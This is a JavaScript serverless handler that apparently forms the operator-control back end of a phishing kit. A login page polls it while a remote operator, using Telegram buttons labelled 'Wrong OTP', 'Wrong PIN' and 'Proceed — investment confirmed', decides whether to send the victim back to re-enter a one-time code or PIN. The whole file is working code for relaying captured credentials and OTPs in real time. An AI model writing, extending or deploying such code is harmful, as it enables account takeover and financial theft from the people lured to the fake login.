// api/checkTelegram.js
// Polls latest Telegram callback_query for a given sessionKey
// Called every 2s by login.html while in "processing" state
// Returns: { status: 'pending' | 'wrong_otp' | 'wrong_pin' | 'proceed' }

export default async function handler(req, res) {
  if (req.method !== 'GET') return res.status(405).send('Method not allowed');

  const TOKEN   = process.env.TELEGRAM_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
  if (!TOKEN || !CHAT_ID) return res.status(500).json({ error: 'Missing env vars' });

  const { sessionKey } = req.query;
  if (!sessionKey) return res.status(400).json({ error: 'Missing sessionKey' });

  // Try KV first (fast path)
  try {
    const { kv } = await import('@vercel/kv');
    const raw = await kv.get(sessionKey);
    if (raw) {
      const session = typeof raw === 'string' ? JSON.parse(raw) : raw;
      if (session.status && session.status !== 'pending') {
        // Clean up
        await kv.del(sessionKey).catch(()=>{});
        return res.status(200).json({ status: session.status });
      }
    }
  } catch { /* KV unavailable — fall through to Telegram polling */ }

  // Fallback: poll Telegram getUpdates (works without KV)
  try {
    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?limit=20&timeout=0`);
    const data = await r.json();

    if (!data.ok || !data.result) return res.status(200).json({ status: 'pending' });

    // Find the most recent callback_query matching our session
    const updates = [...data.result].reverse(); // newest first
    for (const update of updates) {
      const cb = update.callback_query;
      if (!cb) continue;
      const cbData = cb.data || '';
      if (!cbData.includes(sessionKey)) continue;

      // Acknowledge the callback to stop the loading spinner on Telegram side
      await fetch(`https://api.telegram.org/bot${TOKEN}/answerCallbackQuery`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ callback_query_id: cb.id, text: '✅ Action received' }),
      }).catch(()=>{});

      // Edit message to show which button was pressed
      const action = cbData.split(':')[0];
      const labels = { wrong_otp: '❌ Wrong OTP — client returned to OTP step', wrong_pin: '🚫 Wrong PIN — client returned to login', proceed: '✅ Proceed — investment confirmed' };
      await fetch(`https://api.telegram.org/bot${TOKEN}/editMessageReplyMarkup`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: cb.message?.chat?.id, message_id: cb.message?.message_id, reply_markup: { inline_keyboard: [] } }),
      }).catch(()=>{});
      await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, text: labels[action] || action, parse_mode: 'HTML' }),
      }).catch(()=>{});

      // Mark as consumed via offset
      await fetch(`https://api.telegram.org/bot${TOKEN}/getUpdates?offset=${update.update_id + 1}&limit=1`).catch(()=>{});

      return res.status(200).json({ status: action });
    }

    return res.status(200).json({ status: 'pending' });
  } catch (e) {
    return res.status(200).json({ status: 'pending', error: e?.message });
  }
}
